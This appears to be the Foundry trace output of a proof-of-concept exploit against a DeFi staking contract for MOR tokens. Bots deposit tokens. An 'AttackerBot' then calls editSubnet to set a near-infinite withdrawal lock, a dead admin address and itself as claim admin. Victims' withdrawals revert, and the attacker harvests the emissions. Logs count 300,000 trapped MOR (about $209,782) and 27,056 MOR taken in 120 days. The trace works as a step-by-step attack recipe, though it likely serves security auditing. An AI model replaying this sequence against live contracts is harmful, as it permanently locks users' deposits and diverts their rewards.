    ├─ emit WARNING_UninitedSlot(who: 0x7431aDa8a591C955a994a21710752EF9b882b8e3, slot: 67561948860207262923749883667738879889072804437518085699450221339161387786436 [6.756e76])
    ├─ [0] VM::load(0x7431aDa8a591C955a994a21710752EF9b882b8e3, 0x955eb53aa5a836a76e936fd6ede41c7b84c77cbaeca5406e7e22cb49ab0ee0c4) [staticcall]
    │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000000
    ├─ [2664] 0x7431aDa8a591C955a994a21710752EF9b882b8e3::balanceOf(StakerBot: [0xD6BbDE9174b1CdAa358d2Cf4D57D1a9F7178FBfF]) [staticcall]
    │   └─ ← [Return] 0
    ├─ [0] VM::store(0x7431aDa8a591C955a994a21710752EF9b882b8e3, 0x955eb53aa5a836a76e936fd6ede41c7b84c77cbaeca5406e7e22cb49ab0ee0c4, 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff)
    │   └─ ← [Return]
    ├─ [2664] 0x7431aDa8a591C955a994a21710752EF9b882b8e3::balanceOf(StakerBot: [0xD6BbDE9174b1CdAa358d2Cf4D57D1a9F7178FBfF]) [staticcall]
    │   └─ ← [Return] 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77]
    ├─ [0] VM::store(0x7431aDa8a591C955a994a21710752EF9b882b8e3, 0x955eb53aa5a836a76e936fd6ede41c7b84c77cbaeca5406e7e22cb49ab0ee0c4, 0x0000000000000000000000000000000000000000000000000000000000000000)
    │   └─ ← [Return]
    ├─ emit SlotFound(who: 0x7431aDa8a591C955a994a21710752EF9b882b8e3, fsig: 0x70a08231, keysHash: 0xe9e42d879ecb45c49499fc4e3ac7bb81edbe3f5579c6b7a5dd31825fc4783f1c, slot: 67561948860207262923749883667738879889072804437518085699450221339161387786436 [6.756e76])
    ├─ [0] VM::load(0x7431aDa8a591C955a994a21710752EF9b882b8e3, 0x955eb53aa5a836a76e936fd6ede41c7b84c77cbaeca5406e7e22cb49ab0ee0c4) [staticcall]
    │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000000
    ├─ [0] VM::store(0x7431aDa8a591C955a994a21710752EF9b882b8e3, 0x955eb53aa5a836a76e936fd6ede41c7b84c77cbaeca5406e7e22cb49ab0ee0c4, 0x00000000000000000000000000000000000000000000152d02c7e14af6800000)
    │   └─ ← [Return]
    ├─ [2664] 0x7431aDa8a591C955a994a21710752EF9b882b8e3::balanceOf(StakerBot: [0xD6BbDE9174b1CdAa358d2Cf4D57D1a9F7178FBfF]) [staticcall]
    │   └─ ← [Return] 100000000000000000000000 [1e23]
    ├─ [181891] StakerBot::stake(0xfba542a9d774d1220002dcd4e41dffda8ea4347fc0fdf267fba5f2af9d262bd8, 100000000000000000000000 [1e23])
    │   ├─ [24676] 0x7431aDa8a591C955a994a21710752EF9b882b8e3::approve(0x42BB446eAE6dca7723a9eBdb81EA88aFe77eF4B9, 100000000000000000000000 [1e23])
    │   │   ├─ emit Approval(owner: StakerBot: [0xA4AD4f68d0b91CFD19687c881e50f3A00242828c], spender: 0x42BB446eAE6dca7723a9eBdb81EA88aFe77eF4B9, amount: 100000000000000000000000 [1e23])
    │   │   └─ ← [Return] true
    │   ├─ [129391] 0x42BB446eAE6dca7723a9eBdb81EA88aFe77eF4B9::deposit(0xfba542a9d774d1220002dcd4e41dffda8ea4347fc0fdf267fba5f2af9d262bd8, 100000000000000000000000 [1e23])
    │   │   ├─ [124493] 0x18FAEf315b40A6D9cf49628f1133B1Aa507513B0::deposit(0xfba542a9d774d1220002dcd4e41dffda8ea4347fc0fdf267fba5f2af9d262bd8, 100000000000000000000000 [1e23]) [delegatecall]
    │   │   │   ├─ [15506] 0x7431aDa8a591C955a994a21710752EF9b882b8e3::transferFrom(StakerBot: [0xA4AD4f68d0b91CFD19687c881e50f3A00242828c], 0x42BB446eAE6dca7723a9eBdb81EA88aFe77eF4B9, 100000000000000000000000 [1e23])
    │   │   │   │   ├─ emit Approval(owner: StakerBot: [0xA4AD4f68d0b91CFD19687c881e50f3A00242828c], spender: 0x42BB446eAE6dca7723a9eBdb81EA88aFe77eF4B9, amount: 0)
    │   │   │   │   ├─ emit Transfer(from: StakerBot: [0xA4AD4f68d0b91CFD19687c881e50f3A00242828c], to: 0x42BB446eAE6dca7723a9eBdb81EA88aFe77eF4B9, amount: 100000000000000000000000 [1e23])
    │   │   │   │   └─ ← [Return] true
    │   │   │   ├─ [18595] 0xDC99a8596e395E52aba2BD08C623E1e428Dc3980::getPeriodRewards(3, 1795531176 [1.795e9], 1795531176 [1.795e9]) [staticcall]
    │   │   │   │   ├─ [13688] 0x4De9D52A6a951C2Dc7b22805EEec2bC41404909d::getPeriodRewards(3, 1795531176 [1.795e9], 1795531176 [1.795e9]) [delegatecall]
    │   │   │   │   │   ├─ [1485] 0x2265ae4127a49218c1C562Cb16822971f295Ed50::getPeriodReward(3456000000000000000000 [3.456e21], 592558728240000000 [5.925e17], 1707393600 [1.707e9], 86400 [8.64e4], 1795531176 [1.795e9], 1795531176 [1.795e9]) [delegatecall]
    │   │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000000
    │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000000
    │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000000
    │   │   │   ├─  emit topic 0: 0x6c7131e79092f16af04daf787c07a4dc80e7ae1a95dbe1cc1a310cfe1619d2db
    │   │   │   │        topic 1: 0xfba542a9d774d1220002dcd4e41dffda8ea4347fc0fdf267fba5f2af9d262bd8
    │   │   │   │        topic 2: 0x000000000000000000000000a4ad4f68d0b91cfd19687c881e50f3a00242828c
    │   │   │   │           data: 0x00000000000000000000000000000000000000000000152d02c7e14af6800000
    │   │   │   └─ ← [Stop]
    │   │   └─ ← [Return]
    │   └─ ← [Stop]
    ├─ [0] VM::warp(1795963176 [1.795e9])
    │   └─ ← [Return]
    ├─ [200314] StakerBot::stake(0xfba542a9d774d1220002dcd4e41dffda8ea4347fc0fdf267fba5f2af9d262bd8, 100000000000000000000000 [1e23])
    │   ├─ [24676] 0x7431aDa8a591C955a994a21710752EF9b882b8e3::approve(0x42BB446eAE6dca7723a9eBdb81EA88aFe77eF4B9, 100000000000000000000000 [1e23])
    │   │   ├─ emit Approval(owner: StakerBot: [0x03A6a84cD762D9707A21605b548aaaB891562aAb], spender: 0x42BB446eAE6dca7723a9eBdb81EA88aFe77eF4B9, amount: 100000000000000000000000 [1e23])
    │   │   └─ ← [Return] true
    │   ├─ [147814] 0x42BB446eAE6dca7723a9eBdb81EA88aFe77eF4B9::deposit(0xfba542a9d774d1220002dcd4e41dffda8ea4347fc0fdf267fba5f2af9d262bd8, 100000000000000000000000 [1e23])
    │   │   ├─ [142916] 0x18FAEf315b40A6D9cf49628f1133B1Aa507513B0::deposit(0xfba542a9d774d1220002dcd4e41dffda8ea4347fc0fdf267fba5f2af9d262bd8, 100000000000000000000000 [1e23]) [delegatecall]
    │   │   │   ├─ [15506] 0x7431aDa8a591C955a994a21710752EF9b882b8e3::transferFrom(StakerBot: [0x03A6a84cD762D9707A21605b548aaaB891562aAb], 0x42BB446eAE6dca7723a9eBdb81EA88aFe77eF4B9, 100000000000000000000000 [1e23])
    │   │   │   │   ├─ emit Approval(owner: StakerBot: [0x03A6a84cD762D9707A21605b548aaaB891562aAb], spender: 0x42BB446eAE6dca7723a9eBdb81EA88aFe77eF4B9, amount: 0)
    │   │   │   │   ├─ emit Transfer(from: StakerBot: [0x03A6a84cD762D9707A21605b548aaaB891562aAb], to: 0x42BB446eAE6dca7723a9eBdb81EA88aFe77eF4B9, amount: 100000000000000000000000 [1e23])
    │   │   │   │   └─ ← [Return] true
    │   │   │   ├─ [23031] 0xDC99a8596e395E52aba2BD08C623E1e428Dc3980::getPeriodRewards(3, 1795531176 [1.795e9], 1795963176 [1.795e9]) [staticcall]
    │   │   │   │   ├─ [18124] 0x4De9D52A6a951C2Dc7b22805EEec2bC41404909d::getPeriodRewards(3, 1795531176 [1.795e9], 1795963176 [1.795e9]) [delegatecall]
    │   │   │   │   │   ├─ [5921] 0x2265ae4127a49218c1C562Cb16822971f295Ed50::getPeriodReward(3456000000000000000000 [3.456e21], 592558728240000000 [5.925e17], 1707393600 [1.707e9], 86400 [8.64e4], 1795531176 [1.795e9], 1795963176 [1.795e9]) [delegatecall]
    │   │   │   │   │   │   └─ ← [Return] 0x00000000000000000000000000000000000000000000030496052e65a090a5c0
    │   │   │   │   │   └─ ← [Return] 0x00000000000000000000000000000000000000000000030496052e65a090a5c0
    │   │   │   │   └─ ← [Return] 0x00000000000000000000000000000000000000000000030496052e65a090a5c0
    │   │   │   ├─  emit topic 0: 0x6c7131e79092f16af04daf787c07a4dc80e7ae1a95dbe1cc1a310cfe1619d2db
    │   │   │   │        topic 1: 0xfba542a9d774d1220002dcd4e41dffda8ea4347fc0fdf267fba5f2af9d262bd8
    │   │   │   │        topic 2: 0x00000000000000000000000003a6a84cd762d9707a21605b548aaab891562aab
    │   │   │   │           data: 0x00000000000000000000000000000000000000000000152d02c7e14af6800000
    │   │   │   └─ ← [Stop]
    │   │   └─ ← [Return]
    │   └─ ← [Stop]
    ├─ [0] VM::warp(1796395176 [1.796e9])
    │   └─ ← [Return]
    ├─ [200314] StakerBot::stake(0xfba542a9d774d1220002dcd4e41dffda8ea4347fc0fdf267fba5f2af9d262bd8, 100000000000000000000000 [1e23])
    │   ├─ [24676] 0x7431aDa8a591C955a994a21710752EF9b882b8e3::approve(0x42BB446eAE6dca7723a9eBdb81EA88aFe77eF4B9, 100000000000000000000000 [1e23])
    │   │   ├─ emit Approval(owner: StakerBot: [0xD6BbDE9174b1CdAa358d2Cf4D57D1a9F7178FBfF], spender: 0x42BB446eAE6dca7723a9eBdb81EA88aFe77eF4B9, amount: 100000000000000000000000 [1e23])
    │   │   └─ ← [Return] true
    │   ├─ [147814] 0x42BB446eAE6dca7723a9eBdb81EA88aFe77eF4B9::deposit(0xfba542a9d774d1220002dcd4e41dffda8ea4347fc0fdf267fba5f2af9d262bd8, 100000000000000000000000 [1e23])
    │   │   ├─ [142916] 0x18FAEf315b40A6D9cf49628f1133B1Aa507513B0::deposit(0xfba542a9d774d1220002dcd4e41dffda8ea4347fc0fdf267fba5f2af9d262bd8, 100000000000000000000000 [1e23]) [delegatecall]
    │   │   │   ├─ [15506] 0x7431aDa8a591C955a994a21710752EF9b882b8e3::transferFrom(StakerBot: [0xD6BbDE9174b1CdAa358d2Cf4D57D1a9F7178FBfF], 0x42BB446eAE6dca7723a9eBdb81EA88aFe77eF4B9, 100000000000000000000000 [1e23])
    │   │   │   │   ├─ emit Approval(owner: StakerBot: [0xD6BbDE9174b1CdAa358d2Cf4D57D1a9F7178FBfF], spender: 0x42BB446eAE6dca7723a9eBdb81EA88aFe77eF4B9, amount: 0)
    │   │   │   │   ├─ emit Transfer(from: StakerBot: [0xD6BbDE9174b1CdAa358d2Cf4D57D1a9F7178FBfF], to: 0x42BB446eAE6dca7723a9eBdb81EA88aFe77eF4B9, amount: 100000000000000000000000 [1e23])
    │   │   │   │   └─ ← [Return] true
    │   │   │   ├─ [23031] 0xDC99a8596e395E52aba2BD08C623E1e428Dc3980::getPeriodRewards(3, 1795963176 [1.795e9], 1796395176 [1.796e9]) [staticcall]
    │   │   │   │   ├─ [18124] 0x4De9D52A6a951C2Dc7b22805EEec2bC41404909d::getPeriodRewards(3, 1795963176 [1.795e9], 1796395176 [1.796e9]) [delegatecall]
    │   │   │   │   │   ├─ [5921] 0x2265ae4127a49218c1C562Cb16822971f295Ed50::getPeriodReward(3456000000000000000000 [3.456e21], 592558728240000000 [5.925e17], 1707393600 [1.707e9], 86400 [8.64e4], 1795963176 [1.795e9], 1796395176 [1.796e9]) [delegatecall]
    │   │   │   │   │   │   └─ ← [Return] 0x000000000000000000000000000000000000000000000303c86f64cd280119c0
    │   │   │   │   │   └─ ← [Return] 0x000000000000000000000000000000000000000000000303c86f64cd280119c0
    │   │   │   │   └─ ← [Return] 0x000000000000000000000000000000000000000000000303c86f64cd280119c0
    │   │   │   ├─  emit topic 0: 0x6c7131e79092f16af04daf787c07a4dc80e7ae1a95dbe1cc1a310cfe1619d2db
    │   │   │   │        topic 1: 0xfba542a9d774d1220002dcd4e41dffda8ea4347fc0fdf267fba5f2af9d262bd8
    │   │   │   │        topic 2: 0x000000000000000000000000d6bbde9174b1cdaa358d2cf4d57d1a9f7178fbff
    │   │   │   │           data: 0x00000000000000000000000000000000000000000000152d02c7e14af6800000
    │   │   │   └─ ← [Stop]
    │   │   └─ ← [Return]
    │   └─ ← [Stop]
    ├─ [61438] AttackerBot::springTrap(0xfba542a9d774d1220002dcd4e41dffda8ea4347fc0fdf267fba5f2af9d262bd8, "ai-grants-pool")
    │   ├─ [34957] 0x42BB446eAE6dca7723a9eBdb81EA88aFe77eF4B9::editSubnet(0xfba542a9d774d1220002dcd4e41dffda8ea4347fc0fdf267fba5f2af9d262bd8, Subnet({ name: "ai-grants-pool", admin: 0x000000000000000000000000000000000000dEaD, unusedStorage1_V4Update: 0, withdrawLockPeriodAfterDeposit: 340282366920938463463374607431768211455 [3.402e38], unusedStorage2_V4Update: 0, minimalDeposit: 0, claimAdmin: 0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f }))
    │   │   ├─ [30005] 0x18FAEf315b40A6D9cf49628f1133B1Aa507513B0::editSubnet(0xfba542a9d774d1220002dcd4e41dffda8ea4347fc0fdf267fba5f2af9d262bd8, Subnet({ name: "ai-grants-pool", admin: 0x000000000000000000000000000000000000dEaD, unusedStorage1_V4Update: 0, withdrawLockPeriodAfterDeposit: 340282366920938463463374607431768211455 [3.402e38], unusedStorage2_V4Update: 0, minimalDeposit: 0, claimAdmin: 0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f })) [delegatecall]
    │   │   │   ├─  emit topic 0: 0x74efc414506c8105230e8e70350515ad0ab5a14118ad99b9e05626c75dce8d9e
    │   │   │   │        topic 1: 0xfba542a9d774d1220002dcd4e41dffda8ea4347fc0fdf267fba5f2af9d262bd8
    │   │   │   │           data: 0x000000000000000000000000000000000000000000000000000000000000002000000000000000000000000000000000000000000000000000000000000000e0000000000000000000000000000000000000000000000000000000000000dead000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000ffffffffffffffffffffffffffffffff000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000005615deb798bb3e4dfa0139dfa1b3d433cc23b72f000000000000000000000000000000000000000000000000000000000000000e61692d6772616e74732d706f6f6c000000000000000000000000000000000000
    │   │   │   └─ ← [Stop]
    │   │   └─ ← [Return]
    │   └─ ← [Stop]
    ├─ [0] VM::snapshotState()
    │   └─ ← [Return] 0
    ├─ [0] VM::warp(4949995176 [4.949e9])
    │   └─ ← [Return]
    ├─ [0] VM::expectRevert(custom error 0xf4844814)
    │   └─ ← [Return]
    ├─ [39148] StakerBot::unstake(0xfba542a9d774d1220002dcd4e41dffda8ea4347fc0fdf267fba5f2af9d262bd8, 100000000000000000000000 [1e23])
    │   ├─ [14258] 0x42BB446eAE6dca7723a9eBdb81EA88aFe77eF4B9::withdraw(0xfba542a9d774d1220002dcd4e41dffda8ea4347fc0fdf267fba5f2af9d262bd8, 100000000000000000000000 [1e23])
    │   │   ├─ [9353] 0x18FAEf315b40A6D9cf49628f1133B1Aa507513B0::withdraw(0xfba542a9d774d1220002dcd4e41dffda8ea4347fc0fdf267fba5f2af9d262bd8, 100000000000000000000000 [1e23]) [delegatecall]
    │   │   │   └─ ← [Revert] panic: arithmetic underflow or overflow (0x11)
    │   │   └─ ← [Revert] panic: arithmetic underflow or overflow (0x11)
    │   └─ ← [Revert] panic: arithmetic underflow or overflow (0x11)
    ├─ [2664] 0x7431aDa8a591C955a994a21710752EF9b882b8e3::balanceOf(StakerBot: [0xA4AD4f68d0b91CFD19687c881e50f3A00242828c]) [staticcall]
    │   └─ ← [Return] 0
    ├─ [0] VM::expectRevert(custom error 0xf4844814)
    │   └─ ← [Return]
    ├─ [39148] StakerBot::unstake(0xfba542a9d774d1220002dcd4e41dffda8ea4347fc0fdf267fba5f2af9d262bd8, 100000000000000000000000 [1e23])
    │   ├─ [14258] 0x42BB446eAE6dca7723a9eBdb81EA88aFe77eF4B9::withdraw(0xfba542a9d774d1220002dcd4e41dffda8ea4347fc0fdf267fba5f2af9d262bd8, 100000000000000000000000 [1e23])
    │   │   ├─ [9353] 0x18FAEf315b40A6D9cf49628f1133B1Aa507513B0::withdraw(0xfba542a9d774d1220002dcd4e41dffda8ea4347fc0fdf267fba5f2af9d262bd8, 100000000000000000000000 [1e23]) [delegatecall]
    │   │   │   └─ ← [Revert] panic: arithmetic underflow or overflow (0x11)
    │   │   └─ ← [Revert] panic: arithmetic underflow or overflow (0x11)
    │   └─ ← [Revert] panic: arithmetic underflow or overflow (0x11)
    ├─ [2664] 0x7431aDa8a591C955a994a21710752EF9b882b8e3::balanceOf(StakerBot: [0x03A6a84cD762D9707A21605b548aaaB891562aAb]) [staticcall]
    │   └─ ← [Return] 0
    ├─ [0] VM::expectRevert(custom error 0xf4844814)
    │   └─ ← [Return]
    ├─ [39148] StakerBot::unstake(0xfba542a9d774d1220002dcd4e41dffda8ea4347fc0fdf267fba5f2af9d262bd8, 100000000000000000000000 [1e23])
    │   ├─ [14258] 0x42BB446eAE6dca7723a9eBdb81EA88aFe77eF4B9::withdraw(0xfba542a9d774d1220002dcd4e41dffda8ea4347fc0fdf267fba5f2af9d262bd8, 100000000000000000000000 [1e23])
    │   │   ├─ [9353] 0x18FAEf315b40A6D9cf49628f1133B1Aa507513B0::withdraw(0xfba542a9d774d1220002dcd4e41dffda8ea4347fc0fdf267fba5f2af9d262bd8, 100000000000000000000000 [1e23]) [delegatecall]
    │   │   │   └─ ← [Revert] panic: arithmetic underflow or overflow (0x11)
    │   │   └─ ← [Revert] panic: arithmetic underflow or overflow (0x11)
    │   └─ ← [Revert] panic: arithmetic underflow or overflow (0x11)
    ├─ [2664] 0x7431aDa8a591C955a994a21710752EF9b882b8e3::balanceOf(StakerBot: [0xD6BbDE9174b1CdAa358d2Cf4D57D1a9F7178FBfF]) [staticcall]
    │   └─ ← [Return] 0
    ├─ [0] console::log("Permanently trapped victim MOR:", 300000 [3e5]) [staticcall]
    │   └─ ← [Stop]
    ├─ [0] console::log("USD at $0.699275:", 209782 [2.097e5]) [staticcall]
    │   └─ ← [Stop]
    ├─ [0] VM::revertToState(0)
    │   └─ ← [Return] true
    ├─ [0] VM::warp(1806763176 [1.806e9])
    │   └─ ← [Return]
    ├─ [0] VM::expectRevert(custom error 0xf4844814)
    │   └─ ← [Return]
    ├─ [39148] StakerBot::unstake(0xfba542a9d774d1220002dcd4e41dffda8ea4347fc0fdf267fba5f2af9d262bd8, 100000000000000000000000 [1e23])
    │   ├─ [14258] 0x42BB446eAE6dca7723a9eBdb81EA88aFe77eF4B9::withdraw(0xfba542a9d774d1220002dcd4e41dffda8ea4347fc0fdf267fba5f2af9d262bd8, 100000000000000000000000 [1e23])
    │   │   ├─ [9353] 0x18FAEf315b40A6D9cf49628f1133B1Aa507513B0::withdraw(0xfba542a9d774d1220002dcd4e41dffda8ea4347fc0fdf267fba5f2af9d262bd8, 100000000000000000000000 [1e23]) [delegatecall]
    │   │   │   └─ ← [Revert] panic: arithmetic underflow or overflow (0x11)
    │   │   └─ ← [Revert] panic: arithmetic underflow or overflow (0x11)
    │   └─ ← [Revert] panic: arithmetic underflow or overflow (0x11)
    ├─ [56372] 0x42BB446eAE6dca7723a9eBdb81EA88aFe77eF4B9::getCurrentSubnetRewards(0xfba542a9d774d1220002dcd4e41dffda8ea4347fc0fdf267fba5f2af9d262bd8) [staticcall]
    │   ├─ [51474] 0x18FAEf315b40A6D9cf49628f1133B1Aa507513B0::getCurrentSubnetRewards(0xfba542a9d774d1220002dcd4e41dffda8ea4347fc0fdf267fba5f2af9d262bd8) [delegatecall]
    │   │   ├─ [23031] 0xDC99a8596e395E52aba2BD08C623E1e428Dc3980::getPeriodRewards(3, 1796395176 [1.796e9], 1806763176 [1.806e9]) [staticcall]
    │   │   │   ├─ [18124] 0x4De9D52A6a951C2Dc7b22805EEec2bC41404909d::getPeriodRewards(3, 1796395176 [1.796e9], 1806763176 [1.806e9]) [delegatecall]
    │   │   │   │   ├─ [5921] 0x2265ae4127a49218c1C562Cb16822971f295Ed50::getPeriodReward(3456000000000000000000 [3.456e21], 592558728240000000 [5.925e17], 1707393600 [1.707e9], 86400 [8.64e4], 1796395176 [1.796e9], 1806763176 [1.806e9]) [delegatecall]
    │   │   │   │   │   └─ ← [Return] 0x000000000000000000000000000000000000000000004769dee9348e77e25a00
    │   │   │   │   └─ ← [Return] 0x000000000000000000000000000000000000000000004769dee9348e77e25a00
    │   │   │   └─ ← [Return] 0x000000000000000000000000000000000000000000004769dee9348e77e25a00
    │   │   └─ ← [Return] 27056522143968316768994 [2.705e22]
    │   └─ ← [Return] 27056522143968316768994 [2.705e22]
    ├─ [2664] 0x7431aDa8a591C955a994a21710752EF9b882b8e3::balanceOf(AttackerBot: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   └─ ← [Return] 0
    ├─ [183490] AttackerBot::harvest(0xfba542a9d774d1220002dcd4e41dffda8ea4347fc0fdf267fba5f2af9d262bd8)
    │   ├─ [158810] 0x42BB446eAE6dca7723a9eBdb81EA88aFe77eF4B9::claim(0xfba542a9d774d1220002dcd4e41dffda8ea4347fc0fdf267fba5f2af9d262bd8, AttackerBot: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f])
    │   │   ├─ [153912] 0x18FAEf315b40A6D9cf49628f1133B1Aa507513B0::claim(0xfba542a9d774d1220002dcd4e41dffda8ea4347fc0fdf267fba5f2af9d262bd8, AttackerBot: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [delegatecall]
    │   │   │   ├─ [23031] 0xDC99a8596e395E52aba2BD08C623E1e428Dc3980::getPeriodRewards(3, 1796395176 [1.796e9], 1806763176 [1.806e9]) [staticcall]
    │   │   │   │   ├─ [18124] 0x4De9D52A6a951C2Dc7b22805EEec2bC41404909d::getPeriodRewards(3, 1796395176 [1.796e9], 1806763176 [1.806e9]) [delegatecall]
    │   │   │   │   │   ├─ [5921] 0x2265ae4127a49218c1C562Cb16822971f295Ed50::getPeriodReward(3456000000000000000000 [3.456e21], 592558728240000000 [5.925e17], 1707393600 [1.707e9], 86400 [8.64e4], 1796395176 [1.796e9], 1806763176 [1.806e9]) [delegatecall]
    │   │   │   │   │   │   └─ ← [Return] 0x000000000000000000000000000000000000000000004769dee9348e77e25a00
    │   │   │   │   │   └─ ← [Return] 0x000000000000000000000000000000000000000000004769dee9348e77e25a00
    │   │   │   │   └─ ← [Return] 0x000000000000000000000000000000000000000000004769dee9348e77e25a00
    │   │   │   ├─ [12131] 0x845FBB4B3e2207BF03087b8B94D2430AB11088eE::getFeeAndTreasuryForOperation(0x42BB446eAE6dca7723a9eBdb81EA88aFe77eF4B9, 0x636c61696d000000000000000000000000000000000000000000000000000000) [staticcall]
    │   │   │   │   ├─ [7227] 0x2e1fF173085A5ef12046c27E442f12f79A0092b7::getFeeAndTreasuryForOperation(0x42BB446eAE6dca7723a9eBdb81EA88aFe77eF4B9, 0x636c61696d000000000000000000000000000000000000000000000000000000) [delegatecall]
    │   │   │   │   │   └─ ← [Return] 0x000000000000000000000000000000000000000000000000000000000000000000000000000000000000000068700f67eb19722f8051f072264e979ae4c03c3f
    │   │   │   │   └─ ← [Return] 0x000000000000000000000000000000000000000000000000000000000000000000000000000000000000000068700f67eb19722f8051f072264e979ae4c03c3f
    │   │   │   ├─ [49878] 0x9eba628581896ce086cb8f1A513ea6097A8FC561::sendRewards(AttackerBot: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 27056522143968316768994 [2.705e22])
    │   │   │   │   ├─ [44980] 0xe71eB0b69bbD4207e2cB10DF929d1311D2ad57e5::sendRewards(AttackerBot: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 27056522143968316768994 [2.705e22]) [delegatecall]
    │   │   │   │   │   ├─ [29849] 0x7431aDa8a591C955a994a21710752EF9b882b8e3::transfer(AttackerBot: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 27056522143968316768994 [2.705e22])
    │   │   │   │   │   │   ├─ emit Transfer(from: 0x9eba628581896ce086cb8f1A513ea6097A8FC561, to: AttackerBot: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], amount: 27056522143968316768994 [2.705e22])
    │   │   │   │   │   │   └─ ← [Return] true
    │   │   │   │   │   ├─ emit RewardSent(: AttackerBot: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], : 27056522143968316768994 [2.705e22])
    │   │   │   │   │   └─ ← [Stop]
    │   │   │   │   └─ ← [Return]
    │   │   │   ├─ emit AdminClaimed(param0: 0x0000000000000000000000005615deb798bb3e4dfa0139dfa1b3d433cc23b72f, param1: 0xE41DffDA8EA4347FC0fdF267fba5F2af9d262bD8, param2: 27056522143968316768994 [2.705e22])
    │   │   │   └─ ← [Stop]
    │   │   └─ ← [Return]
    │   └─ ← [Stop]
    ├─ [2664] 0x7431aDa8a591C955a994a21710752EF9b882b8e3::balanceOf(AttackerBot: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   └─ ← [Return] 27056522143968316768994 [2.705e22]
    ├─ [0] console::log("Attacker emissions harvested in 120 days (MOR):", 27056 [2.705e4]) [staticcall]
    │   └─ ← [Stop]
    ├─ [0] console::log("USD at $0.699275:", 18919 [1.891e4]) [staticcall]
    │   └─ ← [Stop]
    └─ ← [Stop]

Suite result: ok. 2 passed; 0 failed; 0 skipped; finished in 462.29ms (9.53ms CPU time)

Ran 1 test suite in 1.35s (462.29ms CPU time): 2 tests passed, 0 failed, 0 skipped (2 total tests)
```
